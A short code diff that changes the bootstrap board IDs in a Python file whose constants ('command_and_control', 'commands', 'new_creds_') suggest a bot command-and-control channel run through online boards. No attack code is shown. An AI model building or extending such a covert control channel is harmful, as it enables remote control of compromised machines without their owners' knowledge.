@@ -12,8 +12,8 @@ from cryptography.hazmat.primitives.serialization import load_pem_public_key
 import base64
 
 
-BOT_BOOTSTRAP_BOARD_ID = '639637edc1f14f01dd74eff6'
-SERVER_BOOTSTRAP_BOARD_ID = '63cec3e960da1500882c90ff'
+BOT_BOOTSTRAP_BOARD_ID = '643954f7af9ff7dac8219b74'
+SERVER_BOOTSTRAP_BOARD_ID = '643958f70982a5ca720c03d8'
 BOOTSTRAP_LIST_NAME_PREFIX = 'new_creds_'
 BOT_BOARD_NAME = 'command_and_control'
 BOT_LIST_NAME = 'commands'
